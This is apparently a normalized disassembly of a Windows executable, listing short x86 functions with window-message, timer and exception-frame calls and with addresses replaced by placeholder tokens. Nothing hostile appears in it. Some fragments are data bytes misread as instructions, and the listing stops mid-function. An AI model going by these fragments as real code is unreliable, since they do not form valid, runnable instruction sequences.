pop ecx
pop ecx
pop ebp
retn
sub_454f28
jmp sub_4039a0
sub_454f2f
pop ebp
retn
sub_455aa7
[ edi + edi * 8 - 0x2f002f ]
sub_455aae
stc
jmp esp
sub_456d17
adc [ eax ] al
cmp al 0x0
add [ eax ] al
les esi [ eax + r--data ]
add [ eax ] al
hlt
sub_456d70
mov eax [ rw-data ]
retn
sub_456d78
mov [ rw-data ] eax
retn
sub_456ec0
jmp sub_4036ec
sub_456ef7
jmp sub_4039a0
sub_456efe
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457206
jmp sub_4039a0
sub_45720d
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4572b1
jmp sub_4039a0
sub_4572b8
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457348
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_457a74
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_458120
sub_457a90
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_457a74
sub_457bb0
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_458120
sub_457bc8
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_458120
sub_457be0
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_458120
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_457c0c
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_457c18
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_458120
retn
sub_457ef8
push ebx
mov ebx edx
mov edx ebx
call sub_443a38
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_457f68
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_458090
jmp sub_4039a0
sub_458097
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4580a0
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_4574ac
mov eax [ ebx + 0x20c ]
call sub_4574ac
sub_458100
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_458110
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45820b
jmp sub_4039a0
sub_458218
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_458230
sub_45844c
retn
sub_4584ba
jmp sub_4039a0
sub_4584f9
jmp sub_4039a0
sub_45852c
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_444f30
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_457738
retn
sub_458550
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_444f50
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_457738
retn
sub_458645
jmp sub_4039a0
sub_45864c
mov eax [ ebp - 0x4 ]
call sub_446ee8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4573a0
mov eax [ ebp - 0x4 ]
call sub_458120
sub_458780
jmp sub_4039a0
sub_4587b8
jmp sub_4039a0
sub_4587bf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4587df
lea eax [ ebp - 0x114 ]
call sub_403f9c
retn
sub_4587d8
jmp sub_4039a0
sub_4587df
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_458ae6
jmp sub_4039a0
sub_458aed
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035c0
j_sub_4036ec#9
jmp sub_4036ec
sub_458bbd
jmp sub_4036ec
sub_458bc2
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_460064
call sub_403a54
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458f7a
jmp sub_4039a0
sub_458f81
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45905c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dfb8
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_459074
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4590ac
mov edx eax
mov eax esi
call sub_41f840
pop esi
pop ebx
retn
sub_459090
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a450
mov edx eax
mov eax esi
call sub_41f840
pop esi
pop ebx
retn
sub_4590ac
push ebx
mov ebx eax
mov eax ebx
call sub_45a0f0
mov edx r-xdata
call sub_423ce4
pop ebx
retn
sub_4591b0
push ebx
mov ebx eax
mov eax ebx
call sub_4591c0
xor al 0x1
pop ebx
retn
sub_4591c0
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45921c
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_45923c
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_45925c
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_459555
jmp sub_4039a0
sub_45955c
pop ecx
pop ebp
retn
sub_459560
xor eax eax
retn
sub_459838
jmp sub_4039a0
sub_45983f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40324c
retn
sub_459855
jmp sub_4039a0
sub_45993f
jmp sub_4039a0
sub_459946
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459963
mov eax [ ebp - 0xc ]
call sub_40324c
retn
sub_45995c
jmp sub_4039a0
sub_459983
jmp sub_4039a0
sub_459c6e
jmp sub_4039a0
sub_459e01
jmp sub_4039a0
sub_45a0f0
mov eax [ eax + 0x238 ]
retn
sub_45a0f8
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_45a104
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_45a442
jmp sub_4039a0
sub_45a449
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a450
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_45a498
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44414c
sub_45a4b4
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_45a4f0
push ebx
mov ebx eax
mov eax ebx
call sub_4460e0
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_423720
sub_45a574
push ebx
mov ebx eax
mov eax ebx
call sub_446108
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_423d88
sub_45a594
push ebx
mov ebx eax
mov eax ebx
call sub_45a1b4
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_45a27c
pop ebx
retn
sub_45adc1
lea eax [ ebp - 0xb4 ]
call sub_403f9c
retn
sub_45adcd
jmp sub_4039a0
j_sub_45adc1
jmp sub_45adc1
sub_45add4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45af2c
jmp sub_4039a0
sub_45af33
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b218
jmp sub_4039a0
sub_45b21f
mov eax [ rw-data ]
call sub_45dad0
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b236
add [ eax ] al
retn
sub_45b494
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_45b4b4
mov eax [ eax + 0x240 ]
call sub_429bb0
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_45f870
sub_45b55b
jmp sub_4039a0
sub_45b562
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b585
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_423d60
retn
sub_45b57e
jmp sub_4039a0
sub_45b585
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b744
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45b4b4
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_45b9ac
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_453714
sub_45ba97
jmp sub_4039a0
sub_45ba9e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45baa4
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_45b28c
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_45bafc
call sub_45c824
retn
sub_45bf49
jmp sub_4039a0
sub_45bf50
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036ec#8
jmp sub_4036ec
j_sub_4036ec#7
jmp sub_4036ec
sub_45c6e1
jmp sub_4039a0
sub_45c6e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c705
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
sub_45c6fe
jmp sub_4039a0
sub_45c705
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45c70c
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_429bb0
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_459154
sub_45c72c
call sub_40324c
retn
sub_45c784
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45c7ea
jmp sub_4039a0
sub_45c998
jmp sub_4036ec
sub_45c9c4
xor edx edx
call sub_4594b8
retn
sub_45c9cc
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_4594b8
mov eax ebx
call sub_440624
pop ebx
retn
sub_45ca52
jmp sub_4039a0
sub_45ca59
pop ebx
pop ecx
pop ebp
retn
sub_45ca60
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_446be4
push eax
call PostMessageA
pop ebx
retn
sub_45cc64
jmp sub_4039a0
sub_45cd05
jmp sub_4039a0
sub_45cd0f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cd2e
mov eax [ rw-data ]
call sub_45ef48
retn
sub_45cd27
jmp sub_4039a0
sub_45cd2e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cd4b
lea eax [ ebp - 0x20 ]
call sub_403f9c
retn
sub_45cd44
jmp sub_4039a0
sub_45cd4b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ce2c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_43f7d0
retn
mov edx eax
mov eax [ rw-data ]
call sub_45e59c
retn
sub_45d1b0
mov edx eax
mov eax [ rw-data ]
call sub_460064
mov al 0x1
retn
sub_45d298
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45d1c0
sub_45d2ac
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45d1c0
sub_45d2c0
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_45d1c0
sub_45d2d4
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_45d1c0
sub_45d2e8
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45d453
jmp sub_4039a0
sub_45d45a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d460
push ebx
mov ebx eax
mov eax ebx
call sub_4454c4
mov eax ebx
call sub_445648
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45ca60
sub_45d6d6
jmp sub_4039a0
sub_45d6dd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d6e4
push ebx
mov ebx edx
mov edx ebx
call sub_44592c
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43f8d8
pop ebx
retn
sub_45d738
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45d7a0
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45d750
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45d7a0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45d76c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45d7a0
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45d784
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45d7a0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45da20
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45da2c
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45da38
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45da44
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45da50
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45da5c
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45da68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_41a238
pop esi
pop ebx
retn
sub_45da7c
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45da98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a238
pop esi
pop ebx
retn
sub_45daac
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45dab4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a238
pop esi
pop ebx
retn
sub_45dac8
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45dba4
mov eax [ eax + 0x54 ]
call sub_41a0dc
retn
sub_45dbb0
mov eax [ eax + 0x54 ]
call sub_41a37c
retn
sub_45de03
jmp sub_4039a0
sub_45de47
jmp sub_4039a0
sub_45de4e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45de9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45dc9c
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403ff0
pop esi
pop ebx
retn
sub_45df08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_41a238
pop esi
pop ebx
retn
sub_45df1c
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_45e121
jmp sub_4039a0
sub_45e128
pop ebx
mov esp ebp
pop ebp
retn
sub_45e130
inc [ eax + 0x8c ]
retn
sub_45e138
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_45e158
sub_45e158
xor edx edx
call sub_45e59c
retn
sub_45e58e
jmp sub_4039a0
sub_45e615
jmp sub_4039a0
sub_45e624
add eax 0x30
call sub_40d420
retn
sub_45e668
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_45e6b9
jmp sub_4036ec
sub_45e6be
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_460064
call sub_403a54
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_45ed8d
jmp sub_4039a0
sub_45ed94
pop ebx
mov esp ebp
pop ebp
retn
sub_45ef1c
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45ef48
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45ef74
xor edx edx
call sub_45ee6c
retn
sub_45ef7c
mov dl 0x1
call sub_45ee6c
retn
sub_45eff0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45f008
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45f0d5
jmp sub_4039a0
sub_45f0dc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45f826
jmp sub_4036ec
sub_45fb46
jmp sub_4039a0
sub_45fb4d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45fdb8
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_45fd20
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
sub_45fecc
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_4036ec#6
jmp sub_4036ec
sub_460009
jmp sub_4036ec
sub_460042
jmp sub_4039a0
sub_460049
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460050
call sub_40cf70
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_460249
jmp sub_4039a0
sub_460250
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_460317
jmp sub_4039a0
sub_46031e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4604f4
jmp sub_4039a0
sub_4604fb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46055c
jmp sub_4039a0
sub_460563
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46056c
call sub_460334
retn
sub_460757
jmp sub_4036ec
sub_4607b0
jmp sub_4039a0
sub_4607b7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4608e5
jmp sub_4039a0
sub_460a44
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_460d43
jmp sub_4039a0
sub_460d72
jmp sub_4039a0
sub_460e7e
jmp sub_4039a0
sub_460e85
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_461216
jmp sub_4039a0
sub_46121d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461340
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46138b
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_46139c
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_4613ac
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_4613bc
add [ eax ] eax
add [ eax ] al
sub al 0x2e
inc edi
add al ch
0x43
sub_46141f
jmp sub_4039a0
sub_461426
pop ebp
retn
sub_461428
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4613bc
call sub_403d70
call sub_461340
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_45704c
call sub_419d2c
sub_4615c8
mov edx 0xafffd5ff
[ esi - 0x3005201 ]
sub_462029
jmp sub_4039a0
sub_462030
pop ecx
pop ebp
retn
sub_462034
and eax 0xff
shl eax 0x10
and edx 0xff
or eax edx
retn
sub_462048
shr eax 0x10
retn
sub_46204c
and eax 0xff
retn
sub_462054
xor eax eax
retn
sub_4621c0
push ebx
mov ebx edx
mov edx ebx
call sub_438e78
test [ ebx + 0x4 ] 0x30
jne r-xdata
pop ebx
retn
or [ ebx + 0x4 ] 0x10
sub_4621e4
push ebx
mov ebx eax
mov eax ebx
call sub_446108
mov eax ebx
call sub_4621f8
pop ebx
retn
sub_4623da
jmp sub_4039a0
sub_462934
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_4629f8
call sub_438590
retn
sub_462a00
call sub_4385b0
retn
sub_462a30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46299c
test eax eax
setne al
pop esi
pop ebx
retn
sub_462ae8
cmp dl [ eax + 0x281 ]
je r-xdata
retn
mov [ eax + 0x281 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_462b64
cmp edx [ eax + 0x298 ]
je r-xdata
retn
mov [ eax + 0x298 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_462b78
cmp edx [ eax + 0x294 ]
je r-xdata
retn
mov [ eax + 0x294 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_462bb1
jmp sub_4039a0
sub_462bb8
pop ebp
retn
sub_462bbc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_461fb0
sub_462c19
jmp sub_4039a0
sub_462c20
pop ebp
retn
sub_462c24
sub [ rw-data ] 0x1
retn
sub_462e8f
jmp sub_4039a0
sub_462f2a
jmp sub_4039a0
sub_462f50
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_462de8
call sub_4039d8
pop ebx
retn
sub_463158
jmp sub_4039a0
sub_46315f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463204
jmp sub_4039a0
sub_46320b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4632b6
jmp sub_4039a0
sub_4632bd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4634c8
jmp sub_4039a0
sub_4634cf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4637e8
jmp sub_4039a0
sub_4637ef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463812
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_404a04
retn
sub_46380b
jmp sub_4039a0
sub_463812
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_463930
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
retn
sub_463aa9
jmp sub_4039a0
sub_463ab0
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_463ab8
push 0x0
xor ecx ecx
call sub_4639e4
retn
sub_463ac4
xor ecx ecx
mov edx 0x20
call sub_402c58
retn
sub_463d82
jmp sub_4039a0
sub_463d89
pop ebp
retn
sub_463e09
jmp sub_4039a0
sub_463e10
pop ebp
retn
sub_463e14
sub [ rw-data ] 0x1
retn
sub_463ea7
add [ esp + 0x4 ] 0xfffffff0
jmp sub_464638
sub_463eb1
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405a78
sub_463ebb
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405aa0
sub_463f71
add eax 0xffffffe0
jmp sub_464b4c
sub_463f79
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a78
sub_463f83
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405aa0
sub_463f97
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_463fa3
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405a78
sub_464099
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a78
sub_4640a3
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405aa0
sub_4640b7
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_4640c3
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405a78
sub_4640cd
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405aa0
sub_4643af
jmp sub_4039a0
sub_4643b6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464416
jmp sub_4039a0
sub_46441d
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_464467
jmp sub_4039a0
sub_46446e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4644f4
cmp [ eax + 0x18 ] 0x0
jne r-xdata
retn
call sub_464584
sub_464568
jmp sub_4039a0
sub_46456f
pop ebx
pop ecx
pop ebp
retn
sub_464584
push ebx
mov ebx eax
lea ecx [ ebx + 0x10 ]
mov edx r-xdata
mov eax [ ebx + 0xc ]
call sub_463224
lea eax [ ebx + 0xc ]
call sub_4059cc
pop ebx
retn
sub_46461b
jmp sub_4036ec
sub_464620
call sub_4642a0
mov ebx eax
call sub_403a54
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_464638
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4647f7
jmp sub_4039a0
sub_464824
jmp sub_4039a0
sub_46482b
pop ebx
mov esp ebp
pop ebp
retn
sub_464999
jmp sub_4039a0
sub_4649c6
jmp sub_4039a0
sub_464b19
jmp sub_4039a0
sub_464b20
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464b92
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_464b9b
jmp sub_4039a0
j_sub_464b92
jmp sub_464b92
sub_464ba2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464c62
jmp sub_4039a0
sub_464c69
pop ecx
pop ecx
pop ebp
retn
sub_464d25
jmp sub_4039a0
sub_464e09
jmp sub_4039a0
sub_464e35
jmp sub_4039a0
sub_464efc
retn
sub_464ffe
jmp sub_4039a0
sub_465150
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
pop ebx
retn
sub_4651a6
jmp sub_4039a0
sub_4651ad
pop ecx
pop ebp
retn
sub_46520e
jmp sub_4039a0
sub_465215
pop ecx
pop ebp
retn
sub_465218
retn
sub_4652d3
jmp sub_4039a0
sub_4652da
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46532f
jmp sub_4039a0
sub_465336
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46537b
jmp sub_4039a0
sub_465382
pop ebx
pop ecx
pop ebp
retn 0x4
sub_465478
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
retn
push ecx
push edx
push eax
call [ rw-data ]
retn
sub_46551b
jmp sub_4039a0
sub_465522
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_465581
jmp sub_4039a0
sub_465588
pop ebp
retn
sub_46558c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
push eax
xor ecx ecx
